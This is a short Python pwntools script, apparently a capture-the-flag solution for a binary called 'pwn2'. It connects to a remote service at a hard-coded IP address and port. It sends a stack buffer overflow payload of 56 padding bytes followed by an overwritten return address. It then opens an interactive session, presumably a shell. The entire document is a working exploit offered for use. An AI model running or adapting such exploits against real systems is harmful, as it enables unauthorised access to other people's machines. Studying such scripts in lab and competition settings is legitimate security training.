from pwn import *

#io = process('./pwn2')
io = remote("117.72.52.127", 11909) 

payload = b'a' * 56 + p64(0x400751)
io.recvline("say something?\n")
io.send(payload)
io.interactive()

